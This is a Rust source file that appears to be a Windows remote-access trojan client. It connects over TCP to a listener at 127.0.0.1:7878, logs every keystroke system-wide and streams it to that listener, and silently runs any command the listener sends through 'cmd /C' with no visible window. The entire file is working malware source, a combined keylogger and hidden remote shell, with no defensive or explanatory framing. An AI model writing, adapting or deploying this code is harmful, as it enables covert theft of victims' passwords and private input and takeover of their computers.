use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use tokio::net::TcpStream;
use std::process::Command;
use std::os::windows::process::CommandExt;
use rdev::{Event, listen};
#[allow(unused)]
use scrap::{Capturer, Display};

trait ToBeBytes {
    fn as_bytes(&self) -> &[u8];
}

trait Bytes {
    fn push_str(&mut self, s: &str);
}


impl ToBeBytes for String {
    fn as_bytes(&self) -> &[u8] {
        String::as_bytes(self)
    }
}

impl Bytes for String {
    fn push_str(&mut self, s: &str) {
        String::push_str(self, s);
    }
}

enum Data<T> {
    Keystroke(T),
}

impl<T: ToBeBytes + Bytes> Data<T> {
    fn process(&mut self) -> &[u8] {
        match self {
            Data::Keystroke(data) => {
                data.push_str("keystroke_reader");
                data.as_bytes()
            }
        }
    }
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let socket = TcpStream::connect("127.0.0.1:7878").await?;
    let (mut rd, mut wr) = io::split(socket);
    let (tx, mut rx) = mpsc::channel(16);

    // spawn blocking for reading client keystrokes synchronously
    // crate rdev do not support async
    tokio::task::spawn_blocking( || {
        let callback = move |event: Event| {
            match event.name {
                Some(string) => tx.blocking_send(Data::Keystroke(string)).expect("cannot send data"),
                None => (),
            }
        };

        if let Err(error) = listen(callback) {
            println!("{:?}", error);
        }
    });

    // receiving data from mpsc channel
    // then writing data to tcp stream
    tokio::spawn(async move  {
        while let Some(mut data) = rx.recv().await {
            wr.write_all(data.process()).await?;
        }

        Ok::<_, io::Error>(())
    });

    let mut buf = vec![0; 256];

    loop {
        let n = rd.read(&mut buf).await?;

        if n == 0 {
            break;
        }

        let command = std::str::from_utf8(&buf[..n]);
        
        match command {
            Ok(command) => {
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("cannot decode bytes to str")
        }
    }

    Ok(())
}
